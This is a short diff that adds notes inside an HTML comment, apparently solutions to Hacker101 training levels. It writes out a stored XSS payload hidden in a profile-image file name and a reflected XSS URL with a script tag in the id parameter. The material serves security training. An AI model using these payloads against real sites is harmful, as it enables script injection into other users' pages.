@@ -9,9 +9,11 @@
     
 <!--
 Stored XSS:
-
+.png"</body><script>alert(1)</script>.png
+Save this as your profile image to return a broken page with Stored XSS that is called once upon loading profile and twice when editing profile 
 
 Reflected XSS:
 https://levels-a.hacker101.com/levels/2/?id=%3Cscript%3Ealert(1)%3C/script%3E
+Append <script>alert(1)</script> in the id for Reflected XSS
 
 -->
